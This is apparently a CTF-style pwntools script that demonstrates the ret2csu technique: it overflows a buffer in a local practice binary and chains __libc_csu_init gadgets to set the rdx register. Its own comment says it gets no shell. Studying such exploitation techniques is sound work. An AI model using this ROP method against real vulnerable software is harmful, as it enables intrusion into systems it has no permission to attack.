# note not get shell, just demo how to use it to control rdx.

from pwn import *

context.arch = 'amd64'
libc = ELF('./libc.so.6')
elf  = ELF('./simple')

r = process('./simple')

csu = elf.symbols['__libc_csu_init']
# pop rbx, rbp, r12345
csu_90 = csu+90
# mov rdx, r15; mov rsi, r14; mov edi, r13d; call [r12+rbx*8]
# add rbx, 1; cmp rbx, rbx; jne csu_64 else csu_90
csu_64 = csu+64

gdb.attach(r, 'b *0x40067d\nc')
r.sendline('a'*0x18+flat(csu_90, 0, 0, 0, 0, 0, 0xfaceb00c, csu_64))

r.interactive()